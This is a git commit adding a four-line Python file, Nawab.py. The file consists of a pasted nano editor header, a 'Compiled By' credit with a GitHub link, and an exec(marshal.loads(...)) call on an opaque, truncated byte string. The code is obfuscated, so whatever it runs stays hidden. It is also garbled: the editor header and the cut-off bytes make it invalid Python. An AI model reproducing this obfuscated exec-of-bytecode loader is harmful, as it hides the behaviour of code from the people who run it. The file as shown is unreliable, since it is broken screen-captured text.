afd4c00b8f7df5f551757368c9d94f8b2faf364f
HASNAIN-XD <163038273+HASNAIN-XD@users.noreply.github.com>
2024-03-11 23:35:29 +0500

    Create Nawab.py

---
+++ Nawab.py
@@ -0,0 +1,4 @@
+GNU nano 7.2              /sdcard/xd/Nawabenc.py
+#Compiled By:SIAL ZADA
+#https://github.com/M4STERMIND1                                            import marshal
+exec(marshal.loads(b'\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\>
